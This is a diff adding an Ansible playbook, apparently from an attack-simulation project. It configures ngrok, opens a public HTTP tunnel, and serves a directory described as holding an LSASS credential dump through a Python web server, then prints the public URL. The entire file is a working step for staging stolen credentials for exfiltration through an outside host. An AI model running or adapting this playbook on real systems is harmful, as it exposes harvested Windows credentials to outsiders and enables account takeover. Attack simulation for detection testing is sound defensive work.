@@ -1,1 +1,25 @@
+---
+- name: Configure ngrok authtoken
+  shell: |
+    /usr/local/bin/ngrok authtoken {{ ngrok_authtoken }}
 
+- name: Start ngrok http tunnel
+  shell: |
+    nohup /usr/local/bin/ngrok http 80 &
+
+- name: Wait for ngrok to start
+  pause:
+    seconds: 5
+
+- name: Get ngrok public URL
+  shell: |
+    curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url
+  register: ngrok_url
+
+- name: Create HTTP server to serve the lsass dump
+  shell: |
+    nohup python3 -m http.server 80 --directory /opt/RBA/attack/simulation/data &
+
+- name: Display the output
+  debug:
+    msg: "{{ ngrok_url.stdout }}"
